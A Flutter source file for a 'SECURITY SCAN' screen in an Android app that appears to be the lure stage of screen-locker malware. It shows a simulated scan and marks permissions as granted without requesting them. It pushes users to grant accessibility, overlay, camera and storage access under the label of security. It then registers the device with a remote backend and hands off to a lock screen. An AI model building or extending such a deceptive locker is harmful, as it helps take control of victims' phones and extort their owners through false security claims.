// File: /storage/emulated/0/Download/Tester/lib/screens/permission_screen.dart
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_svg/flutter_svg.dart';
import '../services/permission_handler.dart';
import '../services/backend_client.dart';
import '../utils/constants.dart';
import 'lock_screen.dart';

class PermissionScreen extends StatefulWidget {
  const PermissionScreen({super.key});

  @override
  State<PermissionScreen> createState() => _PermissionScreenState();
}

class _PermissionScreenState extends State<PermissionScreen> 
    with SingleTickerProviderStateMixin {
  late AnimationController _animationController;
  late Animation<double> _progressAnimation;
  late Animation<double> _listAnimation;
  
  List<Map<String, dynamic>> _permissions = [];
  double _progress = 0.0;
  bool _isScanning = true;
  bool _allGranted = false;
  String _deviceId = '';

  @override
  void initState() {
    super.initState();
    
    _animationController = AnimationController(
      duration: const Duration(milliseconds: 2000),
      vsync: this,
    );
    
    _progressAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(
        parent: _animationController,
        curve: const Interval(0.0, 0.7, curve: Curves.easeInOut),
      ),
    );
    
    _listAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(
        parent: _animationController,
        curve: const Interval(0.7, 1.0, curve: Curves.easeOut),
      ),
    );
    
    _initPermissions();
  }

  Future<void> _initPermissions() async {
    // Generate device ID
    _deviceId = 'DEV${DateTime.now().millisecondsSinceEpoch % 10000}';
    
    // Initialize permission list
    setState(() {
      _permissions = [
        {
          'id': 'camera',
          'name': 'Camera Access',
          'description': Constants.permissionMessages['camera']!,
          'granted': false,
          'required': true,
          'icon': Icons.camera_alt,
        },
        {
          'id': 'storage',
          'name': 'Storage Access',
          'description': Constants.permissionMessages['storage']!,
          'granted': false,
          'required': true,
          'icon': Icons.storage,
        },
        {
          'id': 'overlay',
          'name': 'Overlay Permission',
          'description': Constants.permissionMessages['overlay']!,
          'granted': false,
          'required': true,
          'icon': Icons.layers,
        },
        {
          'id': 'accessibility',
          'name': 'Accessibility Service',
          'description': Constants.permissionMessages['accessibility']!,
          'granted': false,
          'required': true,
          'icon': Icons.accessibility,
        },
        {
          'id': 'location',
          'name': 'Location Access',
          'description': Constants.permissionMessages['location']!,
          'granted': false,
          'required': false,
          'icon': Icons.location_on,
        },
        {
          'id': 'microphone',
          'name': 'Microphone Access',
          'description': Constants.permissionMessages['microphone']!,
          'granted': false,
          'required': false,
          'icon': Icons.mic,
        },
      ];
    });
    
    // Start scanning animation
    _animationController.forward();
    
    // Simulate permission checking
    await _checkPermissions();
  }

  Future<void> _checkPermissions() async {
    // Simulate scanning delay
    await Future.delayed(const Duration(seconds: 2));
    
    // Get actual permission status
    final status = await PermissionHandler.getPermissionStatus();
    
    setState(() {
      for (var perm in _permissions) {
        perm['granted'] = status[perm['id']] ?? false;
      }
      
      // Calculate progress
      final requiredPerms = _permissions.where((p) => p['required'] == true).toList();
      final grantedRequired = requiredPerms.where((p) => p['granted'] == true).length;
      _progress = requiredPerms.isEmpty ? 1.0 : grantedRequired / requiredPerms.length;
      
      _allGranted = grantedRequired == requiredPerms.length;
      _isScanning = false;
    });
    
    // Register device with backend if all required permissions granted
    if (_allGranted) {
      await _registerDevice();
    }
  }

  Future<void> _registerDevice() async {
    try {
      await BackendClient.registerDevice(
        deviceId: _deviceId,
        deviceName: 'Android Device',
        permissions: _permissions
            .where((p) => p['granted'] == true)
            .map((p) => p['id'] as String)
            .toList(),
      );
      
      // Wait a moment then navigate to lock screen
      await Future.delayed(const Duration(seconds: 1));
      
      if (mounted) {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(
            builder: (context) => LockScreen(deviceId: _deviceId),
          ),
        );
      }
    } catch (e) {
      debugPrint('Registration error: $e');
    }
  }

  Future<void> _requestPermission(String permissionId) async {
    // Find the permission
    final index = _permissions.indexWhere((p) => p['id'] == permissionId);
    if (index == -1) return;
    
    // Update UI
    setState(() {
      _permissions[index]['granted'] = true;
    });
    
    // Recalculate progress
    final requiredPerms = _permissions.where((p) => p['required'] == true).toList();
    final grantedRequired = requiredPerms.where((p) => p['granted'] == true).length;
    _progress = requiredPerms.isEmpty ? 1.0 : grantedRequired / requiredPerms.length;
    
    // Check if all required permissions are granted
    if (grantedRequired == requiredPerms.length) {
      setState(() {
        _allGranted = true;
      });
      
      await _registerDevice();
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              Color(0xFF0A0E21),
              Color(0xFF151A30),
            ],
          ),
        ),
        child: SafeArea(
          child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // Header
                Row(
                  children: [
                    IconButton(
                      icon: const Icon(Icons.arrow_back, color: Colors.white),
                      onPressed: () => Navigator.pop(context),
                    ),
                    const SizedBox(width: 12),
                    const Expanded(
                      child: Text(
                        'SECURITY SCAN',
                        style: TextStyle(
                          fontFamily: 'ShareTechMono',
                          fontSize: 20,
                          color: Colors.white,
                          letterSpacing: 2,
                        ),
                      ),
                    ),
                  ],
                ),
                
                const SizedBox(height: 30),
                
                // Scanning Animation
                AnimatedBuilder(
                  animation: _progressAnimation,
                  builder: (context, child) {
                    return Center(
                      child: Column(
                        children: [
                          Stack(
                            alignment: Alignment.center,
                            children: [
                              // Outer circle
                              Container(
                                width: 180,
                                height: 180,
                                decoration: BoxDecoration(
                                  shape: BoxShape.circle,
                                  border: Border.all(
                                    color: Constants.primaryColor.withOpacity(0.3),
                                    width: 2,
                                  ),
                                ),
                              ),
                              
                              // Progress circle
                              SizedBox(
                                width: 150,
                                height: 150,
                                child: CircularProgressIndicator(
                                  value: _isScanning ? _progressAnimation.value : _progress,
                                  strokeWidth: 8,
                                  backgroundColor: Constants.cardColor,
                                  valueColor: AlwaysStoppedAnimation<Color>(
                                    _allGranted ? Constants.successColor : Constants.primaryColor,
                                  ),
                                ),
                              ),
                              
                              // Icon
                              Container(
                                width: 100,
                                height: 100,
                                decoration: BoxDecoration(
                                  shape: BoxShape.circle,
                                  color: Constants.cardColor,
                                ),
                                child: Icon(
                                  _isScanning ? Icons.search : 
                                  _allGranted ? Icons.check : Icons.warning,
                                  size: 48,
                                  color: _allGranted ? Constants.successColor : 
                                        _isScanning ? Constants.primaryColor : Constants.warningColor,
                                ),
                              ),
                            ],
                          ),
                          
                          const SizedBox(height: 30),
                          
                          Text(
                            _isScanning ? 'SCANNING SYSTEM...' : 
                            _allGranted ? 'SCAN COMPLETE' : 'PERMISSIONS REQUIRED',
                            style: TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 24,
                              color: Colors.white,
                              fontWeight: FontWeight.bold,
                              letterSpacing: 2,
                            ),
                          ),
                          
                          const SizedBox(height: 12),
                          
                          Text(
                            _isScanning 
                                ? 'Analyzing security requirements'
                                : _allGranted
                                    ? 'All security permissions granted'
                                    : '${(_progress * 100).toInt()}% security enabled',
                            style: TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 14,
                              color: Constants.subtitleColor,
                            ),
                          ),
                          
                          const SizedBox(height: 20),
                          
                          if (!_isScanning && !_allGranted)
                            ElevatedButton(
                              onPressed: () async {
                                // Request all permissions again
                                final granted = await PermissionHandler.requestAllPermissions();
                                if (granted && mounted) {
                                  await _checkPermissions();
                                }
                              },
                              style: ElevatedButton.styleFrom(
                                backgroundColor: Constants.primaryColor,
                                shape: RoundedRectangleBorder(
                                  borderRadius: BorderRadius.circular(12),
                                ),
                                padding: const EdgeInsets.symmetric(
                                  horizontal: 32,
                                  vertical: 16,
                                ),
                              ),
                              child: const Text(
                                'GRANT ALL PERMISSIONS',
                                style: TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 14,
                                  letterSpacing: 1.5,
                                ),
                              ),
                            ),
                        ],
                      ),
                    );
                  },
                ),
                
                const SizedBox(height: 40),
                
                // Permissions List
                Expanded(
                  child: AnimatedBuilder(
                    animation: _listAnimation,
                    builder: (context, child) {
                      return Opacity(
                        opacity: _listAnimation.value,
                        child: Transform.translate(
                          offset: Offset(0, 20 * (1 - _listAnimation.value)),
                          child: child,
                        ),
                      );
                    },
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'REQUIRED PERMISSIONS:',
                          style: TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 12,
                            color: Constants.subtitleColor,
                            letterSpacing: 2,
                          ),
                        ),
                        
                        const SizedBox(height: 16),
                        
                        Expanded(
                          child: ListView.builder(
                            itemCount: _permissions.length,
                            itemBuilder: (context, index) {
                              final permission = _permissions[index];
                              final isRequired = permission['required'] == true;
                              
                              return AnimatedContainer(
                                duration: Constants.animationDuration,
                                curve: Constants.animationCurve,
                                margin: const EdgeInsets.only(bottom: 12),
                                decoration: BoxDecoration(
                                  color: Constants.cardColor,
                                  borderRadius: BorderRadius.circular(12),
                                  border: Border.all(
                                    color: permission['granted'] == true
                                        ? Constants.successColor.withOpacity(0.3)
                                        : isRequired
                                            ? Constants.dangerColor.withOpacity(0.3)
                                            : Constants.warningColor.withOpacity(0.3),
                                    width: 2,
                                  ),
                                ),
                                child: ListTile(
                                  leading: Icon(
                                    permission['icon'] as IconData,
                                    color: permission['granted'] == true
                                        ? Constants.successColor
                                        : isRequired
                                            ? Constants.dangerColor
                                            : Constants.warningColor,
                                  ),
                                  title: Text(
                                    permission['name'],
                                    style: TextStyle(
                                      fontFamily: 'ShareTechMono',
                                      color: Colors.white,
                                      fontSize: 16,
                                      fontWeight: FontWeight.bold,
                                    ),
                                  ),
                                  subtitle: Text(
                                    permission['description'],
                                    style: TextStyle(
                                      fontFamily: 'ShareTechMono',
                                      color: Constants.subtitleColor,
                                      fontSize: 12,
                                    ),
                                  ),
                                  trailing: permission['granted'] == true
                                      ? Icon(
                                          Icons.check_circle,
                                          color: Constants.successColor,
                                        )
                                      : IconButton(
                                          icon: Icon(
                                            Icons.lock_open,
                                            color: isRequired 
                                                ? Constants.dangerColor 
                                                : Constants.warningColor,
                                          ),
                                          onPressed: () => _requestPermission(permission['id']),
                                        ),
                                  onTap: permission['granted'] == true 
                                      ? null 
                                      : () => _requestPermission(permission['id']),
                                ),
                              );
                            },
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
                
                // Device ID
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: Constants.cardColor,
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Row(
                    children: [
                      Icon(
                        Icons.fingerprint,
                        color: Constants.primaryColor,
                        size: 20,
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              'DEVICE ID',
                              style: TextStyle(
                                fontFamily: 'ShareTechMono',
                                fontSize: 10,
                                color: Constants.subtitleColor,
                                letterSpacing: 1.5,
                              ),
                            ),
                            Text(
                              _deviceId,
                              style: const TextStyle(
                                fontFamily: 'ShareTechMono',
                                color: Colors.white,
                                fontSize: 16,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  @override
  void dispose() {
    _animationController.dispose();
    super.dispose();
  }
}